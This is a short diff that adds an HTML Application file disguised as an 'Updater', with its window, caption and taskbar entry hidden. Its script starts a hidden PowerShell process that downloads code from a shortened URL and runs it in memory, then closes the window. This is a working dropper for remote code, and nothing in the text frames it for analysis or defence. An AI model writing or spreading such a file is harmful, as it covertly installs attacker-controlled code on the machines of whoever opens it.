@@ -1,0 +1,16 @@
+<html>
+<head>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="Updater" 
+        BORDER="none" 
+        CAPTION="no" 
+        SHOWINTASKBAR="no" 
+        SINGLEINSTANCE="yes" 
+        WINDOWSTATE="minimize">
+</head>
+<script>
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -WindowStyle Hidden -c \"IEX(irm 'https://lc.cx/H1OaO6')\"", 0, false);
+window.close();
+</script>
+</html>
